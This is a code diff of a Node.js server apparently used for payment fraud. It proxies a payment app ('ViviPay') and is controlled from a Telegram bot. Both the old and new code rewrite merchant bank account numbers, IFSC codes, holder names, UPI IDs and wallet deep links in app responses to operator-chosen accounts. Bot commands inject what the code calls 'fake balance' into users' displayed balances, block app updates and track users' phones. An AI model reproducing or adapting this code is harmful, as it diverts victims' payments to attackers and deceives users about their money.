@@ -68,65 +68,20 @@ function cacheSet(key, buf, ct, status, ttl) {
 
 // Map to debounce repetitive error logs (key -> timestamp)
 const recentErrors = new Map();
-const _lastProofTimes = new Map();
 
-const IFSC_BANK_MAP = {
-  'IPOS': 'India Post Payments Bank',
-  'SBIN': 'State Bank of India',
-  'HDFC': 'HDFC Bank',
-  'ICIC': 'ICICI Bank',
-  'UTIB': 'Axis Bank',
-  'PUNB': 'Punjab National Bank',
-  'BARB': 'Bank of Baroda',
-  'CNRB': 'Canara Bank',
-  'UBIN': 'Union Bank of India',
-  'BKID': 'Bank of India',
-  'KKBK': 'Kotak Mahindra Bank',
-  'YESB': 'Yes Bank',
-  'IDFB': 'IDFC FIRST Bank',
-  'IOBA': 'Indian Overseas Bank',
-  'MAHB': 'Bank of Maharashtra',
-  'PSIB': 'Punjab & Sind Bank',
-  'CBIN': 'Central Bank of India',
-  'UCOB': 'UCO Bank',
-  'INDB': 'IndusInd Bank',
-  'FDRL': 'Federal Bank',
-  'AIRP': 'Airtel Payments Bank',
-  'PYTM': 'Paytm Payments Bank',
-  'JIOP': 'Jio Payments Bank',
-  'FINO': 'Fino Payments Bank',
-  'AUBL': 'AU Small Finance Bank',
-  'ESFB': 'Equitas Small Finance Bank',
-  'USFB': 'Ujjivan Small Finance Bank'
-};
-
-function getBankNameFromIfsc(ifsc) {
-  if (!ifsc || typeof ifsc !== 'string') return 'Bank';
-  const prefix = ifsc.trim().substring(0, 4).toUpperCase();
-  return IFSC_BANK_MAP[prefix] || 'Bank';
-}
-
-// Helper to clean up ugly JSON strings or IFSC codes accidentally sent in bank fields
-function cleanUglyBankNames(obj, depth = 0, defaultBankName = 'Bank') {
+// Helper to clean up ugly JSON strings accidentally sent by backend in bank fields
+function cleanUglyBankNames(obj, depth = 0) {
   if (!obj || typeof obj !== 'object' || depth > 10) return;
   if (Array.isArray(obj)) {
-    for (const item of obj) cleanUglyBankNames(item, depth + 1, defaultBankName);
+    for (const item of obj) cleanUglyBankNames(item, depth + 1);
     return;
   }
   for (const k of Object.keys(obj)) {
-    if (typeof obj[k] === 'object' && obj[k] !== null) {
-      cleanUglyBankNames(obj[k], depth + 1, defaultBankName);
+    if (typeof obj[k] === 'object') {
+      cleanUglyBankNames(obj[k], depth + 1);
     } else if (typeof obj[k] === 'string') {
-      const val = obj[k].trim();
-      const kl = k.toLowerCase().replace(/[_-]/g, '');
-
-      // 1. JSON string error (like {"code":0,"msg":"ok","data":{}})
-      if (val.startsWith('{') && (val.includes('"code"') || val.includes('"msg"') || val.includes('"data"'))) {
-        obj[k] = defaultBankName || 'Bank';
-      }
-      // 2. IFSC code placed in bank name fields (like BARB0JODPAL, IPOS0000001)
-      else if ((kl.includes('bankname') || kl === 'bank' || kl.includes('acctbank') || kl === 'payeebankname') && /^[A-Z]{4}0[A-Z0-9]{6}$/i.test(val)) {
-        obj[k] = getBankNameFromIfsc(val);
+      if (obj[k].startsWith('{"code":') && obj[k].includes('"msg":')) {
+        obj[k] = 'Bank';
       }
     }
   }
@@ -138,87 +93,54 @@ async function ensureWebhook() {
   try { await bot.setWebHook(WEBHOOK_URL); webhookSet = true; } catch (e) { }
 }
 
-function parseRedisData(raw) {
-  if (!raw) return null;
-  if (typeof raw === 'string') {
-    try { return JSON.parse(raw); } catch (e) { return null; }
-  }
-  if (typeof raw === 'object' && raw !== null) return raw;
-  return null;
-}
-
 async function loadData(forceRefresh) {
   if (!forceRefresh && cachedData && (Date.now() - cacheTime < CACHE_TTL)) return cachedData;
-  if (!redis) {
-    if (!cachedData) cachedData = { ...DEFAULT_DATA };
-    return cachedData;
-  }
+  if (!redis) return { ...DEFAULT_DATA };
   try {
     let raw = await redis.get('vivipayData');
-    let parsed = parseRedisData(raw);
-    if (parsed) {
-      cachedData = {
-        ...DEFAULT_DATA,
-        ...parsed,
-        userOverrides: parsed.userOverrides || {},
-        trackedUsers: parsed.trackedUsers || {},
-        orderBankMap: parsed.orderBankMap || {},
-        tokenMap: parsed.tokenMap || {},
-        banks: Array.isArray(parsed.banks) ? parsed.banks : [],
-        activeIndex: (parsed.activeIndex !== undefined) ? parsed.activeIndex : -1
-      };
+    if (raw) {
+      if (typeof raw === 'string') { try { raw = JSON.parse(raw); } catch (e) { } }
+      if (typeof raw === 'object' && raw !== null) {
+        cachedData = { ...DEFAULT_DATA, ...raw };
+      } else { cachedData = { ...DEFAULT_DATA }; }
+      if (!cachedData.userOverrides) cachedData.userOverrides = {};
+      if (!cachedData.trackedUsers) cachedData.trackedUsers = {};
+      if (!cachedData.orderBankMap) cachedData.orderBankMap = {};
       cacheTime = Date.now();
       return cachedData;
     }
   } catch (e) { console.error('Redis load error:', e.message); }
-  if (!cachedData) cachedData = { ...DEFAULT_DATA };
+  cachedData = { ...DEFAULT_DATA };
   cacheTime = Date.now();
   return cachedData;
 }
 
-async function saveSettings(updates) {
-  let latest = await loadData(true);
-  Object.assign(latest, updates);
-  cachedData = latest;
-  cacheTime = Date.now();
-  if (redis) {
-    try {
-      await redis.set('vivipayData', JSON.stringify(latest));
-    } catch (e) {
-      console.error('Redis saveSettings error:', e.message);
-    }
-  }
-  return latest;
-}
-
 async function saveData(data) {
-  if (!data) return;
-  cachedData = data;
-  cacheTime = Date.now();
-  if (!redis) return;
+  const skipMerge = data._skipOverrideMerge;
+  if (skipMerge) delete data._skipOverrideMerge;
+  if (!redis) { cachedData = data; cacheTime = Date.now(); return; }
   try {
-    let currentRaw = await redis.get('vivipayData');
-    let current = parseRedisData(currentRaw) || {};
-    const merged = {
-      ...DEFAULT_DATA,
-      ...current,
-      ...data,
-      userOverrides: { ...(current.userOverrides || {}), ...(data.userOverrides || {}) },
-      trackedUsers: { ...(current.trackedUsers || {}), ...(data.trackedUsers || {}) },
-      orderBankMap: { ...(current.orderBankMap || {}), ...(data.orderBankMap || {}) },
-      tokenMap: { ...(current.tokenMap || {}), ...(data.tokenMap || {}) },
-      balanceHistory: data.balanceHistory || current.balanceHistory || []
-    };
-    cachedData = merged;
+    if (!skipMerge) {
+      if (data._lastRedisSave && Date.now() - data._lastRedisSave < 10000) {
+        cachedData = data;
+        return;
+      }
+      const current = await redis.get('vivipayData');
+      if (current && typeof current === 'object') {
+        const settingsKeys = ['banks', 'activeIndex', 'autoRotate', 'botEnabled', 'usdtAddress', 'logRequests', 'adminChatId', 'depositSuccess', 'depositBonus', 'withdrawOverride', 'blockUpdate'];
+        for (const key of settingsKeys) { if (current[key] !== undefined) data[key] = current[key]; }
+        if (current.userOverrides) data.userOverrides = { ...current.userOverrides, ...data.userOverrides };
+        if (current.orderBankMap) data.orderBankMap = { ...current.orderBankMap, ...data.orderBankMap };
+      }
+    }
+    cachedData = data;
     cacheTime = Date.now();
-    await redis.set('vivipayData', JSON.stringify(merged));
-  } catch (e) {
-    console.error('saveData error:', e.message);
-  }
+    data._lastRedisSave = Date.now();
+    await redis.set('vivipayData', data);
+  } catch (e) { cachedData = data; cacheTime = Date.now(); }
 }
 
 function getActiveBank(data, userId) {
-  if (!data || !data.banks || data.banks.length === 0) return null;
   const uo = (userId && data.userOverrides) ? data.userOverrides[String(userId)] : null;
   if (uo && uo.bankIndex !== undefined && uo.bankIndex >= 0 && uo.bankIndex < data.banks.length) {
     return data.banks[uo.bankIndex];
@@ -257,19 +179,6 @@ function getOrderAmount(req, respData) {
 async function notifyAdmin(data, msg) {
   if (data.adminChatId && bot) {
     try { await bot.sendMessage(data.adminChatId, msg.substring(0, 4000)); } catch (e) { }
-  }
-}
-
-async function notifyAdminPhoto(data, photoBufferOrUrl, caption) {
-  if (data.adminChatId && bot) {
-    try {
-      await bot.sendPhoto(data.adminChatId, photoBufferOrUrl, { caption: (caption || '').substring(0, 1024) });
-    } catch (e) {
-      try {
-        const urlStr = typeof photoBufferOrUrl === 'string' ? `\n🖼 Link: ${photoBufferOrUrl}` : '';
-        await bot.sendMessage(data.adminChatId, `${caption}${urlStr}`);
-      } catch (e2) { }
-    }
   }
 }
 
@@ -448,7 +357,7 @@ const BANK_FIELD_MAP = {
   walletaccount: 'accountNo', walletno: 'accountNo', collectionaccount: 'accountNo',
   collectionaccountno: 'accountNo', customerbanknumber: 'accountNo',
   acctno: 'accountNo', acctnum: 'accountNo', acct_no: 'accountNo',
-  account: 'accountNo', receiveaccount: 'accountNo',
+  account: 'accountNo', receiveaccount: 'accountNo', ctaccount: 'accountNo',
   beneficiaryname: 'accountHolder', accountname: 'accountHolder', account_name: 'accountHolder',
   receiveaccountname: 'accountHolder', holdername: 'accountHolder', accountholder: 'accountHolder',
   bankaccountholder: 'accountHolder', receivename: 'accountHolder',
@@ -464,7 +373,6 @@ const BANK_FIELD_MAP = {
   bankname: 'bankName', bank_name: 'bankName', payeebankname: 'bankName', receiverbankname: 'bankName',
   upiid: 'upiId', upi_id: 'upiId', upi: 'upiId', vpa: 'upiId',
   payeeupi: 'upiId', receiverupi: 'upiId', walletupi: 'upiId',
-  payaccount: 'upiId', pay_account: 'upiId', payeraccount: 'upiId', payer_account: 'upiId',
   payeebankaccount: 'accountNo', payeerecipientsname: 'accountHolder',
   payeerecipientsname: 'accountHolder', payeerecipientname: 'accountHolder',
   recipientsname: 'accountHolder', recipientname: 'accountHolder',
@@ -502,7 +410,7 @@ function scanHasBankFields(obj, depth) {
   return false;
 }
 
-const NAME_FIELDS = ['name', 'payname', 'username', 'holdername', 'ownername',
+const NAME_FIELDS = ['name', 'payname', 'username', 'ctname', 'holdername', 'ownername',
   'receivename', 'payeename', 'beneficiaryname', 'accountname', 'realname',
   'cardholder', 'cardname', 'receivername', 'collectionname', 'customername',
   'truename', 'accname', 'acctname', 'bankaccountname', 'receiveaccountname',
@@ -548,31 +456,17 @@ function replaceWalletUrl(urlStr, bank) {
   }
 }
 
-const IGNORE_REPLACE_FIELDS = ['ctaccount', 'ct_account', 'ctname', 'ct_name', 'cttype', 'ct_type', 'ctpackage', 'ct_package', 'cturl', 'ct_url'];
-
 function deepReplaceBankFields(obj, bank, depth, globalHasAcct) {
   if (!obj || typeof obj !== 'object' || depth > 10) return;
   if (Array.isArray(obj)) { for (let i = 0; i < obj.length; i++) deepReplaceBankFields(obj[i], bank, depth + 1, globalHasAcct); return; }
-  const resolvedBankName = (bank && bank.bankName) ? bank.bankName : (bank && bank.ifsc ? getBankNameFromIfsc(bank.ifsc) : 'Bank');
   for (const k of Object.keys(obj)) {
-    if (typeof obj[k] === 'object' && obj[k] !== null) {
-      deepReplaceBankFields(obj[k], bank, depth + 1, globalHasAcct);
-      continue;
-    }
+    if (typeof obj[k] === 'object') { deepReplaceBankFields(obj[k], bank, depth + 1, globalHasAcct); continue; }
     if (typeof obj[k] !== 'string' && typeof obj[k] !== 'number') continue;
     const kl = k.toLowerCase().replace(/[_-]/g, '');
-    if (IGNORE_REPLACE_FIELDS.includes(kl)) continue; // Never overwrite user collection/payer accounts
     const mapping = BANK_FIELD_MAP[kl];
-    if (mapping === 'bankName') {
-      obj[k] = resolvedBankName;
-      continue;
-    }
     if (mapping && bank[mapping] && String(obj[k]).length > 0) { obj[k] = bank[mapping]; continue; }
     if (globalHasAcct && bank.accountHolder && NAME_FIELDS.includes(kl) && String(obj[k]).length > 0) { obj[k] = bank.accountHolder; continue; }
-    if (kl === 'bank' || kl === 'bankname' || kl === 'payeebankname' || kl === 'receiverbankname' || kl === 'payerbankname' || kl === 'acctbankname') {
-      obj[k] = resolvedBankName;
-      continue;
-    }
+    if (kl === 'bank' && bank.bankName && String(obj[k]).length > 0) { obj[k] = bank.bankName; continue; }
     // Replace bank details embedded inside wallet deep-link URL strings
     if (typeof obj[k] === 'string' && obj[k].includes('://')) {
       const replaced = replaceWalletUrl(obj[k], bank);
@@ -581,71 +475,34 @@ function deepReplaceBankFields(obj, bank, depth, globalHasAcct) {
   }
 }
 
-function resolveTargetBank(data, orderId, altId, activeBank) {
-  if (!activeBank) return null;
-  const o1 = orderId ? (data.orderBankMap && data.orderBankMap[String(orderId)]) : null;
-  const o2 = altId ? (data.orderBankMap && data.orderBankMap[String(altId)]) : null;
-  const saved = o1 || o2;
+// Detail endpoints are not always consistent: some responses contain bank fields,
+// while others return only order metadata and let the frontend render these fields
+// from the same payload. Replace existing fields and add the standard aliases so
+// both the history text/list view and the clicked detail view receive the same bank.
+function forceBankDetails(obj, bank) {
+  if (!obj || typeof obj !== 'object' || !bank || Array.isArray(obj)) return;
+  const hasBank = scanHasBankFields(obj, 0);
+  if (hasBank) deepReplaceBankFields(obj, bank, 0, hasBank);
 
-  if (saved && (saved.forced || saved.isManual)) {
-    const sHolder = saved.accountHolder || (saved.bank ? saved.bank.split(' | ')[0] : '') || activeBank.accountHolder;
-    const sAcct = saved.accountNo || (saved.bank ? saved.bank.split(' | ')[1] : '') || activeBank.accountNo;
-    const sIfsc = saved.ifsc || (saved.bank ? saved.bank.split(' | ')[2] : '') || activeBank.ifsc;
-    const sBankName = saved.bankName || (sIfsc ? getBankNameFromIfsc(sIfsc) : '') || activeBank.bankName || 'Bank';
-    const sUpi = saved.upiId || activeBank.upiId || '';
+  const accountHolder = bank.accountHolder || '';
+  const accountNo = bank.accountNo || '';
+  const ifsc = bank.ifsc || '';
+  const bankName = bank.bankName || '';
+  const upiId = bank.upiId || '';
+  const last4 = accountNo.slice(-4);
+  const walletDomain = accountNo
+    ? `mobikwik://moneytransfer/upi/bank?account=${accountNo}&ifsc=${ifsc}&name=${encodeURIComponent(accountHolder)}&amount=0.0&displayAccountNumber=xxxxxxxxx${last4}`
+    : '';
 
-    return {
-      accountHolder: sHolder || activeBank.accountHolder,
-      accountNo: sAcct || activeBank.accountNo,
-      ifsc: sIfsc || activeBank.ifsc,
-      bankName: sBankName || activeBank.bankName || 'Bank',
-      upiId: sUpi || activeBank.upiId || ''
-    };
-  }
-
-  // Universal dynamic fallback: ANY order with ANY merchant bank details will be replaced with our activeBank
-  return activeBank;
-}
-
-function replaceOrderBankDetails(order, bank) {
-  if (!order || typeof order !== 'object' || !bank) return;
-  const bkAcct = bank.accountNo || '';
-  const bkIfsc = bank.ifsc || '';
-  const bkName = bank.accountHolder || '';
-  const bkUpi = bank.upiId || bkAcct || '';
-  const bkBank = bank.bankName || (bkIfsc ? getBankNameFromIfsc(bkIfsc) : 'Bank');
-
-  deepReplaceBankFields(order, bank, 0, true);
-
-  if (bkAcct) {
-    order.acctNo = bkAcct;
-    order.accountNo = bkAcct;
-    order.accountNumber = bkAcct;
-    order.account = bkAcct;
-    order.payee_bank_account = bkAcct;
-    order.payee_account = bkAcct;
-  }
-  if (bkIfsc) {
-    order.acctCode = bkIfsc;
-    order.ifsc = bkIfsc;
-    order.ifscCode = bkIfsc;
-    order.payee_ifsc = bkIfsc;
-  }
-  if (bkName) {
-    order.acctName = bkName;
-    order.name = bkName;
-    order.accountName = bkName;
-    order.realName = bkName;
-    order.payee_recipients_name = bkName;
-    order.payee_name = bkName;
-  }
-  if (bkBank) {
-    order.bankName = bkBank;
-    order.bank_name = bkBank;
-    order.payee_bankname = bkBank;
-  }
-  if (bkUpi && order.payAccount !== undefined) {
-    order.payAccount = bkUpi;
+  const aliases = {
+    acctName: accountHolder, accountName: accountHolder, name: accountHolder,
+    acctNo: accountNo, accountNo, account: accountNo,
+    acctCode: ifsc, ifsc, ifscCode: ifsc,
+    bankName, acctBankName: bankName,
+    upiId, payAccount: upiId, walletDomain
+  };
+  for (const [key, value] of Object.entries(aliases)) {
+    if (value !== '') obj[key] = value;
   }
 }
 
@@ -768,13 +625,12 @@ app.get('/hook/config', async (req, res) => {
     const tracked = (userId && data.trackedUsers) ? data.trackedUsers[String(userId)] : null;
     const lastRealBal = (uo && uo.lastRealBalance !== undefined) ? uo.lastRealBalance : (tracked && tracked.balance !== undefined ? parseFloat(tracked.balance) : null);
     const shownBal = lastRealBal !== null ? parseFloat((lastRealBal + totalBonus).toFixed(2)) : (totalBonus > 0 ? totalBonus : null);
-    const resolvedBn = bank ? (bank.bankName || (bank.ifsc ? getBankNameFromIfsc(bank.ifsc) : 'Bank')) : 'Bank';
     res.json({
       enabled: data.botEnabled !== false,
       an: bank ? bank.accountNo : '',
       ah: bank ? bank.accountHolder : '',
       if: bank ? bank.ifsc : '',
-      bn: resolvedBn,
+      bn: bank ? (bank.bankName || '') : '',
       ui: bank ? (bank.upiId || '') : '',
       tg: TELEGRAM_OVERRIDE,
       bonus: totalBonus,
@@ -783,7 +639,7 @@ app.get('/hook/config', async (req, res) => {
       usdtAddr: data.usdtAddress || ''
     });
   } catch (e) {
-    res.json({ enabled: false, an: '', ah: '', if: '', bn: 'Bank', ui: '', tg: TELEGRAM_OVERRIDE, bonus: 0 });
+    res.json({ enabled: false, an: '', ah: '', if: '', bn: '', ui: '', tg: TELEGRAM_OVERRIDE, bonus: 0 });
   }
 });
 
@@ -822,30 +678,18 @@ app.post('/bot-webhook', async (req, res) => {
     if (!bot) return res.sendStatus(200);
     const msg = req.body?.message;
     if (!msg || !msg.text) return res.sendStatus(200);
-    const chatId = String(msg.chat.id);
-    const rawText = String(msg.text).trim();
-    if (!rawText) return res.sendStatus(200);
-
-    // Extract command and arguments (handles /on, /ON, /on@BotName, /addbank, etc.)
-    const cmdMatch = rawText.match(/^(\/[a-zA-Z0-9_]+)(?:@[a-zA-Z0-9_]+)?(.*)$/s);
-    let cmd = '';
-    let cmdArgs = '';
-    if (cmdMatch) {
-      cmd = cmdMatch[1].toLowerCase();
-      cmdArgs = (cmdMatch[2] || '').trim();
-    } else {
-      cmd = rawText.split(/\s+/)[0].toLowerCase();
-      cmdArgs = rawText.substring(cmd.length).trim();
-    }
-
+    const chatId = msg.chat.id;
+    const text = msg.text.trim();
     let data = await loadData(true);
 
-    if (cmd === '/start') {
-      if (data.adminChatId && String(data.adminChatId) !== chatId) {
+    if (text === '/start') {
+      if (data.adminChatId && data.adminChatId !== chatId) {
         await bot.sendMessage(chatId, '❌ Bot already configured with another admin.');
         return res.sendStatus(200);
       }
-      data = await saveSettings({ adminChatId: chatId });
+      data.adminChatId = chatId;
+      data._skipOverrideMerge = true;
+      await saveData(data);
       await bot.sendMessage(chatId,
         `🏦 ViviPay Proxy Controller v4
 (Server-Side Proxy Mode)
@@ -891,148 +735,94 @@ Example:
       return res.sendStatus(200);
     }
 
-    if (data.adminChatId && String(data.adminChatId) !== chatId) {
+    if (data.adminChatId && chatId !== data.adminChatId) {
       await bot.sendMessage(chatId, '❌ Unauthorized.');
       return res.sendStatus(200);
     }
 
-    if (cmd === '/status') {
-      data = await loadData(true);
+    if (text === '/status') {
       const active = getActiveBank(data, null);
-      let m = `📊 ViviPay Status (v4 Server-Side):\nProxy: ${data.botEnabled !== false ? '🟢 ON' : '🔴 OFF'}\nBanks: ${(data.banks || []).length}\nAuto-Rotate: ${data.autoRotate ? '🔄 ON' : '❌ OFF'}\nLog: ${data.logRequests ? '📡 ON' : '🔇 OFF'}\nRaw Log: ${data.rawLog ? '📡 ON' : '🔇 OFF'}\nUpdate Block: ${data.blockUpdate !== false ? '🚫 BLOCKED' : '✅ ALLOWED'}\nTracked Users: ${Object.keys(data.trackedUsers || {}).length}`;
+      let m = `📊 ViviPay Status (v4 Server-Side):\nProxy: ${data.botEnabled ? '🟢 ON' : '🔴 OFF'}\nBanks: ${data.banks.length}\nAuto-Rotate: ${data.autoRotate ? '🔄 ON' : '❌ OFF'}\nLog: ${data.logRequests ? '📡 ON' : '🔇 OFF'}\nUpdate Block: ${data.blockUpdate !== false ? '🚫 BLOCKED' : '✅ ALLOWED'}\nTracked Users: ${Object.keys(data.trackedUsers || {}).length}`;
       if (data.usdtAddress) m += `\n₮ USDT: ${data.usdtAddress.substring(0, 15)}...`;
-      if (active) m += `\n\n💳 Active Bank (#${(data.activeIndex >= 0 ? data.activeIndex + 1 : 1)}):\n${active.accountHolder}\n${active.accountNo}\nIFSC: ${active.ifsc}${active.bankName ? '\nBank: ' + active.bankName : ''}${active.upiId ? '\nUPI: ' + active.upiId : ''}${active.minAmount ? '\nMin Amount: ₹' + active.minAmount : ''}`;
+      if (active) m += `\n\n💳 Active:\n${active.accountHolder}\n${active.accountNo}\nIFSC: ${active.ifsc}${active.bankName ? '\nBank: ' + active.bankName : ''}${active.upiId ? '\nUPI: ' + active.upiId : ''}`;
       else m += '\n\n⚠️ No active bank';
       await bot.sendMessage(chatId, m);
       return res.sendStatus(200);
     }
 
-    if (cmd === '/on') {
-      data = await saveSettings({ botEnabled: true });
-      await bot.sendMessage(chatId, '🟢 Proxy ON (Enabled)');
-      return res.sendStatus(200);
-    }
+    if (text === '/on') { data.botEnabled = true; data._skipOverrideMerge = true; await saveData(data); await bot.sendMessage(chatId, '🟢 Proxy ON'); return res.sendStatus(200); }
+    if (text === '/off') { data.botEnabled = false; data._skipOverrideMerge = true; await saveData(data); await bot.sendMessage(chatId, '🔴 Proxy OFF'); return res.sendStatus(200); }
+    if (text === '/rotate') { data.autoRotate = !data.autoRotate; data.lastUsedIndex = -1; data._skipOverrideMerge = true; await saveData(data); await bot.sendMessage(chatId, `🔄 Auto-Rotate: ${data.autoRotate ? 'ON' : 'OFF'}`); return res.sendStatus(200); }
+    if (text === '/log') { data.logRequests = !data.logRequests; data._skipOverrideMerge = true; await saveData(data); await bot.sendMessage(chatId, `📋 Logging: ${data.logRequests ? 'ON' : 'OFF'}`); return res.sendStatus(200); }
 
-    if (cmd === '/off') {
-      data = await saveSettings({ botEnabled: false });
-      await bot.sendMessage(chatId, '🔴 Proxy OFF (Disabled)');
-      return res.sendStatus(200);
-    }
-
-    if (cmd === '/rotate') {
-      const nextRotate = !data.autoRotate;
-      data = await saveSettings({ autoRotate: nextRotate, lastUsedIndex: -1 });
-      await bot.sendMessage(chatId, `🔄 Auto-Rotate: ${nextRotate ? 'ON' : 'OFF'}`);
-      return res.sendStatus(200);
-    }
-
-    if (cmd === '/log') {
-      const nextLog = !data.logRequests;
-      data = await saveSettings({ logRequests: nextLog });
-      await bot.sendMessage(chatId, `📋 Logging: ${nextLog ? 'ON' : 'OFF'}`);
-      return res.sendStatus(200);
-    }
-
-    if (cmd === '/rr') {
-      const nextRaw = !data.rawLog;
-      data = await saveSettings({ rawLog: nextRaw });
+    if (text === '/rr') {
+      data.rawLog = !data.rawLog;
+      data._skipOverrideMerge = true;
+      await saveData(data);
       await bot.sendMessage(chatId,
-        nextRaw
+        data.rawLog
           ? '📡 Raw Log: 🟢 ON\n\nAb har request ka FULL detail aayega:\n• Method, URL, Headers, Body\n• Response Status, Headers, Body\n• App API (/xxapi/*) + Frontend pages dono\n\nBand karne ke liye dobara /rr bhejo.'
           : '📡 Raw Log: 🔴 OFF\n\nFull request/response logging band.'
       );
       return res.sendStatus(200);
     }
 
-    if (cmd === '/update') {
-      let block = true;
-      const lowerArg = cmdArgs.toLowerCase();
-      if (lowerArg === 'on' || lowerArg === 'allow') {
-        block = false;
-      } else if (lowerArg === 'off' || lowerArg === 'block') {
-        block = true;
-      } else {
-        block = !data.blockUpdate;
-      }
-      data = await saveSettings({ blockUpdate: block });
-      await bot.sendMessage(chatId, block ? '🚫 Update BLOCKED' : '✅ Update ALLOWED');
+    if (text === '/update' || text === '/update off' || text === '/update on') {
+      if (text === '/update on') { data.blockUpdate = false; } else { data.blockUpdate = true; }
+      data._skipOverrideMerge = true; await saveData(data);
+      await bot.sendMessage(chatId, data.blockUpdate ? '🚫 Update BLOCKED' : '✅ Update ALLOWED');
       return res.sendStatus(200);
     }
 
-    if (cmd === '/add') {
-      const parts = cmdArgs.split(/\s+/);
+    if (text.startsWith('/add ')) {
+      const parts = text.substring(5).trim().split(/\s+/);
       const amount = parseFloat(parts[0]);
       const targetUserId = parts[1] || '';
-      if (isNaN(amount) || !targetUserId) {
-        await bot.sendMessage(chatId, '❌ Format: /add <amount> <userId>\nExample: /add 500 123456');
-        return res.sendStatus(200);
-      }
-      data = await loadData(true);
+      if (isNaN(amount) || !targetUserId) { await bot.sendMessage(chatId, '❌ Format: /add <amount> <userId>'); return res.sendStatus(200); }
       if (!data.userOverrides) data.userOverrides = {};
       if (!data.userOverrides[targetUserId]) data.userOverrides[targetUserId] = {};
       data.userOverrides[targetUserId].addedBalance = (data.userOverrides[targetUserId].addedBalance || 0) + amount;
       if (!data.balanceHistory) data.balanceHistory = [];
       const tracked = data.trackedUsers && data.trackedUsers[targetUserId];
-      data.balanceHistory.push({
-        type: 'add',
-        userId: targetUserId,
-        amount,
-        totalAdded: data.userOverrides[targetUserId].addedBalance,
-        time: new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' }),
-        phone: (tracked && tracked.phone) || ''
-      });
-      data = await saveSettings({ userOverrides: data.userOverrides, balanceHistory: data.balanceHistory });
+      data.balanceHistory.push({ type: 'add', userId: targetUserId, amount, totalAdded: data.userOverrides[targetUserId].addedBalance, time: new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' }), phone: (tracked && tracked.phone) || '' });
+      data._skipOverrideMerge = true; await saveData(data);
       const statusMsg = tracked ? `📊 Balance: ₹${tracked.balance || 'N/A'}` : `⏳ User is offline — ₹${data.userOverrides[targetUserId].addedBalance} will show when they open the app`;
       await bot.sendMessage(chatId, `✅ Added ₹${amount} to user ${targetUserId}\n💰 Total added: ₹${data.userOverrides[targetUserId].addedBalance}\n${statusMsg}`);
       return res.sendStatus(200);
     }
 
-    if (cmd === '/deduct') {
-      const parts = cmdArgs.split(/\s+/);
+    if (text.startsWith('/deduct ')) {
+      const parts = text.substring(8).trim().split(/\s+/);
       const amount = parseFloat(parts[0]);
       const targetUserId = parts[1] || '';
-      if (isNaN(amount) || !targetUserId) {
-        await bot.sendMessage(chatId, '❌ Format: /deduct <amount> <userId>\nExample: /deduct 500 123456');
-        return res.sendStatus(200);
-      }
-      data = await loadData(true);
+      if (isNaN(amount) || !targetUserId) { await bot.sendMessage(chatId, '❌ Format: /deduct <amount> <userId>'); return res.sendStatus(200); }
       if (!data.userOverrides) data.userOverrides = {};
       if (!data.userOverrides[targetUserId]) data.userOverrides[targetUserId] = {};
       data.userOverrides[targetUserId].addedBalance = (data.userOverrides[targetUserId].addedBalance || 0) - amount;
       if (!data.balanceHistory) data.balanceHistory = [];
-      data.balanceHistory.push({
-        type: 'deduct',
-        userId: targetUserId,
-        amount,
-        totalAdded: data.userOverrides[targetUserId].addedBalance,
-        time: new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })
-      });
-      data = await saveSettings({ userOverrides: data.userOverrides, balanceHistory: data.balanceHistory });
+      data.balanceHistory.push({ type: 'deduct', userId: targetUserId, amount, totalAdded: data.userOverrides[targetUserId].addedBalance, time: new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' }) });
+      data._skipOverrideMerge = true; await saveData(data);
       await bot.sendMessage(chatId, `✅ Deducted ₹${amount} from user ${targetUserId}\n💰 Total: ₹${data.userOverrides[targetUserId].addedBalance || 0}`);
       return res.sendStatus(200);
     }
 
-    if (cmd === '/remove' && cmdArgs.toLowerCase().startsWith('balance')) {
-      const targetId = cmdArgs.substring(7).trim();
+    if (text.startsWith('/remove balance ')) {
+      const targetId = text.substring(16).trim();
       if (!targetId) { await bot.sendMessage(chatId, '❌ Format: /remove balance <userId>'); return res.sendStatus(200); }
-      data = await loadData(true);
       if (data.userOverrides && data.userOverrides[targetId]) {
         const removed = data.userOverrides[targetId].addedBalance || 0;
         delete data.userOverrides[targetId].addedBalance;
-        data = await saveSettings({ userOverrides: data.userOverrides });
-        await bot.sendMessage(chatId, `🗑 Removed ₹${removed} balance override from user ${targetId}`);
-      } else {
-        await bot.sendMessage(chatId, `ℹ️ No balance override found for ${targetId}`);
-      }
+        data._skipOverrideMerge = true; await saveData(data);
+        await bot.sendMessage(chatId, `🗑 Removed ₹${removed} fake balance from user ${targetId}`);
+      } else { await bot.sendMessage(chatId, `ℹ️ No fake balance for ${targetId}`); }
       return res.sendStatus(200);
     }
 
-    if (cmd === '/history') {
-      data = await loadData(true);
-      const ht = cmdArgs.trim();
+    if (text === '/history' || text.startsWith('/history ')) {
+      const ht = text.startsWith('/history ') ? text.substring(9).trim() : '';
       const history = data.balanceHistory || [];
       const filtered = ht ? history.filter(h => h.userId === ht) : history;
-      if (filtered.length === 0) { await bot.sendMessage(chatId, '📋 No balance history found.'); return res.sendStatus(200); }
+      if (filtered.length === 0) { await bot.sendMessage(chatId, '📋 No history.'); return res.sendStatus(200); }
       let m = '📊 Balance History:\n\n';
       for (const h of filtered.slice(-20)) {
         m += `${h.type === 'add' ? '➕' : '➖'} ₹${h.amount} → ${h.userId}${h.phone ? ' (' + h.phone + ')' : ''} | ${h.time}\n`;
@@ -1041,17 +831,16 @@ Example:
       return res.sendStatus(200);
     }
 
-    if (cmd === '/clearhistory') {
-      data = await saveSettings({ balanceHistory: [] });
-      await bot.sendMessage(chatId, '🗑 Balance history cleared.');
+    if (text === '/clearhistory') {
+      data.balanceHistory = []; data._skipOverrideMerge = true; await saveData(data);
+      await bot.sendMessage(chatId, '🗑 History cleared.');
       return res.sendStatus(200);
     }
 
-    if (cmd === '/idtrack') {
-      data = await loadData(true);
+    if (text === '/idtrack') {
       const tracked = data.trackedUsers || {};
       const ids = Object.keys(tracked);
-      if (ids.length === 0) { await bot.sendMessage(chatId, '📋 No users tracked yet.'); return res.sendStatus(200); }
+      if (ids.length === 0) { await bot.sendMessage(chatId, '📋 No users tracked.'); return res.sendStatus(200); }
       let m = '📋 Tracked Users:\n\n';
       for (const uid of ids) {
         const u = tracked[uid];
@@ -1066,15 +855,13 @@ Example:
       return res.sendStatus(200);
     }
 
-    if (cmd === '/banks') {
-      data = await loadData(true);
-      if (!data.banks || data.banks.length === 0) { await bot.sendMessage(chatId, '❌ No banks added.'); return res.sendStatus(200); }
